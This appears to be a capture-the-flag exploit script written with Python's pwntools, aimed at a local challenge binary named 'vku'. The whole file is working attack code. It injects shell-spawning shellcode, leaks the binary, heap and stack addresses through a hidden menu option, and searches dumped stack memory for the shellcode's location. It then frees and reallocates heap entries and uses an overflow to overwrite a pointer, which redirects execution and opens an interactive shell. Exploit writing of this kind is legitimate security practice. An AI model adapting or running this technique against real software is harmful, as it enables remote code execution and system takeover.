#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vku', checksec=False)
libc = elf.libc

p = process("./run.sh")
p.sendline(asm(shellcraft.sh()))

p.recvuntil(b"\"")
KEYENV = p.recvuntil(b"\"")[:-1].decode()
log.info(f"KEYENV: {KEYENV}")

p.sendlineafter(b"Your choice : ", b"1337")

p.recvuntil(b"Binary Base : ")
elf.address = int(p.recvline()[:-1], 16)
log.info(f"Base address: {hex(elf.address)}")

p.recvuntil(b"Heap Base   : ")
heap = int(p.recvline()[:-1], 16)
log.info(f"Heap address: {hex(heap)}")

p.recvuntil(b"Stack Base  : ")
stack = int(p.recvline()[:-1], 16)
log.info(f"Stack address: {hex(stack)}")

p.sendlineafter(b': ', hex(stack).encode())
p.sendlineafter(b': ', hex(0x21000).encode())

p.recvuntil(b"Data (Hexdump): \n")
data = p.recvuntil(b"=")[:-4]
leak_bytes = bytes.fromhex(data.decode())

idx = leak_bytes.find(KEYENV.encode()) + len(KEYENV) + 1

shellcodeAddr = stack + idx
log.info(f"Shellcode address: {hex(shellcodeAddr)}")

p.sendlineafter(b"Your choice : ", b"1")
p.sendlineafter(b"Your name: ", p64(elf.sym.your_name) + p64(shellcodeAddr))

p.sendlineafter(b"Name : ", b"ks2n")
p.sendlineafter(b"Age : ", b"1")

p.sendlineafter(b"Your choice : ", b"1")
p.sendlineafter(b"Name : ", b"ks2n")
p.sendlineafter(b"Age : ", b"1")

p.sendlineafter(b"Your choice : ", b"5")
p.sendlineafter(b"Index: ", b"0")

p.sendlineafter(b"Your choice : ", b"1")
p.sendlineafter(b"Name : ", b"A" * 0x44 + p64(elf.sym.your_name))
p.sendlineafter(b"Age : ", b"1")

p.sendlineafter(b"Your choice : ", b"4")
p.sendlineafter(b"Index: ", b"0")

p.interactive()